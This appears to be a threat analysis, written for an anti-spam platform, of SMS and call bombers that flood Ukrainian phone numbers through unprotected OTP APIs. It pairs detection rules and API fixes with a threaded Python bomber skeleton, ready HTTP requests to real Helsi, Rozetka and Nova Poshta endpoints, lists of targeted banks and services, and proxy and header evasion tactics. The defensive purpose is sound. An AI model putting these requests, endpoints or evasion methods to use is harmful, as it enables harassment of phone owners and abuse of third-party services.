# SMS/Call Bomber Analysis for Ukraine (+380)

## Overview

SMS bombers are tools that flood a target phone number with automated SMS messages and calls by exploiting unprotected OTP (One-Time Password) APIs from legitimate services. This analysis covers the attack vectors and targeted services relevant to Ukrainian phone numbers.

## How SMS Bombers Work

### Attack Mechanism

```
┌─────────────────────────────────────────────────────────────────┐
│                    SMS BOMBER ATTACK FLOW                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Attacker inputs target phone: +380XXXXXXXXX                 │
│                            │                                    │
│                            ▼                                    │
│  2. Bomber iterates through list of services                    │
│                            │                                    │
│                            ▼                                    │
│  3. For each service, sends HTTP request to OTP API             │
│     POST /api/auth/send-otp { "phone": "+380..." }              │
│                            │                                    │
│                            ▼                                    │
│  4. Service sends SMS to victim (legitimate OTP)                │
│                            │                                    │
│                            ▼                                    │
│  5. Loop repeats → victim receives 50-100+ SMS per minute       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Technical Implementation

**Typical bomber code structure:**
```python
import requests
import threading

services = [
    {"name": "Service1", "url": "https://api.service1.ua/send-otp", "method": "POST", "data": {"phone": "{target}"}},
    {"name": "Service2", "url": "https://api.service2.ua/auth/sms", "method": "POST", "data": {"mobile": "{target}"}},
    # ... 30-100+ services
]

def attack(phone, count):
    for _ in range(count):
        for service in services:
            try:
                data = {k: v.replace("{target}", phone) for k, v in service["data"].items()}
                requests.post(service["url"], json=data, timeout=5)
            except:
                pass

# Multi-threaded to maximize speed
threads = [threading.Thread(target=attack, args=("+380XXXXXXXXX", 100)) for _ in range(10)]
```

### Key Characteristics

| Feature | Description |
|---------|-------------|
| **Proxy rotation** | Uses residential/datacenter proxies to avoid IP bans |
| **User-Agent rotation** | Mimics different browsers/devices |
| **Threading** | 10-50 concurrent threads for maximum throughput |
| **API variety** | 30-100+ different services to bypass rate limits |
| **No authentication** | Exploits APIs that don't require auth for OTP requests |

## Targeted Ukrainian Services

Based on analysis of active SMS bomber tools, the following Ukrainian services are commonly exploited:

### E-commerce & Retail
| Service | API Endpoint Pattern | Type |
|---------|---------------------|------|
| **Rozetka** | `/v2/registration/request` | Registration OTP |
| **OLX** | `/api/open/oauth/token` | Login OTP |
| **Kasta** | `/api/auth/register` | Registration OTP |
| **Allo** | `/api/auth/register` | Registration OTP |
| **Foxtrot** | `/api/auth/register` | Registration OTP |
| **Comfy** | `/api/auth/register` | Registration OTP |
| **Moyo** | `/api/auth/register` | Registration OTP |
| **Citrus** | `/api/auth/register` | Registration OTP |
| **Stylus** | `/api/auth/register` | Registration OTP |
| **Brain** | `/api/auth/register` | Registration OTP |
| **Hotline** | `/api/auth/register` | Registration OTP |
| **Eldorado** | `/api/auth/register` | Registration OTP |

### Banking & Finance
| Service | API Endpoint Pattern | Risk Level |
|---------|---------------------|------------|
| **Monobank** | `/api/auth/register` | HIGH |
| **PrivatBank** | `/api/auth/register` | HIGH |
| **Raiffeisen** | `/api/auth/register` | HIGH |
| **PUMB** | `/api/auth/register` | HIGH |
| **Oschadbank** | `/api/auth/register` | HIGH |
| **Ukrgasbank** | `/api/auth/register` | HIGH |
| **AlfaBank** | `/api/auth/register` | HIGH |
| **Credit Agricole** | `/api/auth/register` | HIGH |

### Logistics & Delivery
| Service | API Endpoint Pattern | Type |
|---------|---------------------|------|
| **Nova Poshta** | `/v2.0/json/` (Counterparty.save) | Registration |
| **Glovo** | `/api/auth/register` | Registration OTP |
| **Raketa** | `/api/auth/register` | Registration OTP |
| **Uklon** | `/api/auth/register` | Registration OTP |
| **Bolt** | `/api/auth/register` | Registration OTP |
| **OnTaxi** | `/api/auth/register` | Registration OTP |

### Healthcare
| Service | API Endpoint Pattern | Type |
|---------|---------------------|------|
| **Helsi** | `/api/healthy/v2/accounts/send` | Registration OTP |
| **Apteka.ua** | `/api/auth/register` | Registration OTP |
| **3i** | `/api/auth/register` | Registration OTP |

### Media & Entertainment
| Service | API Endpoint Pattern | Type |
|---------|---------------------|------|
| **MEGOGO** | `/api/auth/register` | Registration OTP |
| **Prometheus** | `/api/auth/register` | Registration OTP |

### Real Estate & Jobs
| Service | API Endpoint Pattern | Type |
|---------|---------------------|------|
| **Lun** | `/api/auth/register` | Registration OTP |
| **DomRia** | `/api/auth/register` | Registration OTP |
| **Work.ua** | `/api/auth/register` | Registration OTP |
| **Rabota.ua** | `/api/auth/register` | Registration OTP |

### International Services (Supporting +380)
| Service | Type |
|---------|------|
| Telegram | Login verification |
| Viber | Registration |
| WhatsApp | Registration |
| Instagram | Registration |
| Facebook | Registration |
| TikTok | Registration |
| Discord | Registration |
| Steam | Registration |
| Booking.com | Registration |

## Attack Patterns

### Request Examples

**Helsi.me (Healthcare):**
```http
POST https://helsi.me/api/healthy/v2/accounts/send
Content-Type: application/json

{"phone": "+380XXXXXXXXX", "platform": "PISWeb"}
```

**Rozetka (E-commerce):**
```http
POST https://xl-catalog-api.rozetka.com.ua/v2/registration/request
Content-Type: application/json

{"login": "+380XXXXXXXXX", "registration_source": "web"}
```

**Nova Poshta (Logistics):**
```http
POST https://api.novaposhta.ua/v2.0/json/
Content-Type: application/json

{
  "apiKey": "",
  "modelName": "Counterparty",
  "calledMethod": "save",
  "methodProperties": {
    "FirstName": "Test",
    "Phone": "+380XXXXXXXXX"
  }
}
```

### Evasion Techniques

1. **Proxy chains** - Rotating through 50-200 proxy IPs
2. **Request timing randomization** - 0.5-2s random delays
3. **Header randomization** - Different User-Agents, Accept-Language
4. **Distributed attacks** - Multiple bomber instances on different IPs

## Defense Recommendations

### For Your Anti-Spam Platform

#### 1. Pattern Detection
```
Detection signals:
- Multiple OTP SMS from different services within short timeframe (< 60s)
- Same sender patterns (shortcodes, alphanumeric senders)
- OTP message structure patterns: "Ваш код: XXXXX" / "Your code: XXXXX"
- Burst pattern: 5+ OTP messages within 1 minute
```

#### 2. Sender Fingerprinting
Track known OTP senders commonly abused:
- Alphanumeric senders: "Rozetka", "NovaPoshta", "Monobank", "HELSI", etc.
- Shortcode ranges used by Ukrainian services
- Message template patterns

#### 3. Rate-Based Detection
```
IF (otp_message_count > 5) AND (timeframe < 60 seconds)
   AND (unique_senders > 3)
THEN flag_as_bomber_attack
```

#### 4. Machine Learning Features
- Time between messages
- Sender diversity score
- OTP pattern matching
- Historical baseline for user
- Known bomber service list matching

### API Vulnerabilities Being Exploited

| Vulnerability | Description | Fix |
|---------------|-------------|-----|
| No rate limiting | APIs allow unlimited OTP requests per IP | Implement rate limits |
| No CAPTCHA | No bot verification | Add CAPTCHA after N attempts |
| No phone validation | No check if phone is legitimate | Implement phone reputation |
| Predictable endpoints | Easy to discover OTP endpoints | Add request signing |
| No authentication | OTP endpoint is publicly accessible | Require session token |

## Known Bomber Tools

| Tool | Language | Target Countries | Active |
|------|----------|------------------|--------|
| TBomb | Python | International (40+ countries) | ✅ |
| SMS-Bomber UA | C# | Ukraine (+380) | ✅ |
| SmsBomber (mestr228) | Python | Russia, Ukraine | ✅ |
| HZF Bomber | Python | Ukraine, Russia | ✅ |

## Conclusion

SMS bombers for Ukrainian numbers exploit **30-100+ legitimate services** that have unprotected OTP APIs. The attack is simple but effective: trigger OTP requests from many services simultaneously to flood the victim's phone.

**For your anti-spam platform, focus on:**
1. Detecting burst patterns of OTP messages
2. Maintaining a database of known OTP senders
3. Alerting users when bomber attack is detected
4. Potentially auto-blocking OTP messages during detected attacks
5. Working with services to improve their API security
